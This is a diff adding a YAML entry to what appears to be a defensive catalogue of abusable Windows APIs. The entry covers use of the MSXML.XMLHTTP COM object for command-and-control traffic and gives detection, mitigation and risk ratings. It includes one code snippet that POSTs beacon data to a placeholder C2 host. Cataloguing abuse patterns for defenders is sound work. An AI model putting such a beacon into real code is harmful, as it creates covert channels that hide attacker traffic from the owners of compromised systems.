@@ -1,0 +1,43 @@
+id: aa396215-dd31-43ea-ba0b-4003c46f5750
+name: MSXML.XMLHTTP COM Object
+category: windows-com
+subcategory: network-communication
+api:
+  namespace: MSXML
+  language: COM
+  documentation: https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa927270(v=vs.85)
+  class: XMLHTTP3
+abuse_scenarios:
+- name: C2 communication without System.Net
+  technique_id: T1071.001
+  description: Establish HTTP communication via COM instead of managed APIs
+  code_snippet: var xml = new MSXML2.XMLHTTP(); xml.open("POST", "http://c2/beacon",
+    false); xml.send(beacon_data);
+  detection_difficulty: medium
+  common_in_campaigns: false
+detection:
+- vendor: Microsoft Defender
+  effectiveness: medium
+  notes: Behavioral detection based on API patterns
+mitigation:
+- category: monitoring
+  description: Monitor usage of MSXML.XMLHTTP COM Object
+  feasibility: easy
+risk:
+  severity: high
+  prevalence: widespread
+  ease_of_abuse: easy
+  likelihood_in_real_attacks: 70
+references:
+  techniques:
+  - T1071.001
+  tools:
+  - Cobalt Strike
+  - Mimikatz
+tags:
+- windows-com
+- network-communication
+- lotl
+author: magicsword-io
+created: '2026-01-31'
+verified: true
